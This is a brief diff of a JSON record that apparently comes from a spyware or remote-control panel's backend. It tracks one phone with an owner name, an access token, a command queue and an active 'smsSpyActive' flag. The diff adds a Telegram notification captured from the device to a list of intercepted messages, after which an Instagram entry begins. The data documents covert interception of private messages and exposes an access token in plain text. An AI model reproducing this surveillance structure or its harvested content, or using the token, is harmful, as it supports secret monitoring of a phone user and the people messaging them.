@@ -4,7 +4,7 @@
     "deviceName": "HP-TES123-74EC",
     "ownerUsername": "BLAY VIP",
     "token": "55a5b4006ca55171a079b79bc615ba6c",
-    "lastSeen": 1775472422199,
+    "lastSeen": 1775472437194,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-06T06:50:16.345Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Rejeki Resmi 💚",
+        "content": "This channel can’t be displayed because it violated local laws.",
+        "time": "06/04 17:47",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775472437466
+      },
       {
         "appName": "Instagram",
         "sender": "original_allbase026",
